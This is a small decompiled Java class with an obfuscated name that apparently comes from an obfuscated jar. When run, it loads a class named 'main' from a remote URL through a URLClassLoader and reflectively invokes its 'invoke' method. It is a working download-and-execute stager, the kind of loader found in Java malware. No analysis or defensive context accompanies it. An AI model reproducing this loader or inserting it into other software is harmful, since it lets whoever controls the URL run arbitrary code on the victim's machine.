/*
 * Decompiled with CFR 0_118.
 */
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;

final class cM
implements Runnable {
    final /* synthetic */ String a;

    cM(String string) {
        this.a = string;
    }

    @Override
    public void run() {
        try {
            URLClassLoader uRLClassLoader = new URLClassLoader(new URL[]{new URL(this.a)});
            Class class_ = uRLClassLoader.loadClass("main");
            class_.getDeclaredMethod("invoke", new Class[0]).invoke(null, new Object[0]);
        }
        catch (Exception var1_2) {
            var1_2.printStackTrace();
        }
    }
}

